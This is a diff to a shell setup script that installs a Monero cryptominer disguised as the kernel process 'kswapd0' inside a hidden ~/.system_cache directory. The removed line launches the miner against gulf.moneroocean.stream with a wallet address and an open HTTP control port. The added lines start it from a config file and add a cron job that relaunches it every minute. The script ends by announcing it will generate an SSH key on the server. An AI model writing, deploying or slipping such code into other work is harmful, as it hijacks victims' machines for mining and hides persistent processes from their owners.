@@ -356,13 +356,16 @@ cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
 cat $HOME/.system_cache/config.json
 
-# Cronjob erstellen
-# Nur einen Cronjob hinzufügen, falls nicht vorhanden
-(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -
+# Run kswapd0 if no other process with the specific configuration is running
+if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
+    echo "kswapd0 not started. Starting it..."
+    "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
+else
+    echo "kswapd0 is already running."
+fi
 
-# Skript für den Cronjob erstellen
+echo "[*] Create the check script"
 cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
-
 #!/bin/bash
 lockfile="$HOME/.system_cache/check_and_start.lock"
 
@@ -371,12 +374,16 @@ exec 200>"$lockfile"
 flock -n 200 || exit 1
 
 if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
-  $HOME/.system_cache/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+  "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
 fi
 EOF
 
-# Skript ausführbar machen
-chmod +x $HOME/.system_cache/check_and_start.sh
+echo "[*] Make the check script executable"
+chmod +x "$HOME/.system_cache/check_and_start.sh"
+
+echo "[*] Nur einen Cronjob hinzufügen, falls nicht vorhanden"
+(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -
+
 
 echo "[*] Generating ssh key on server"
 
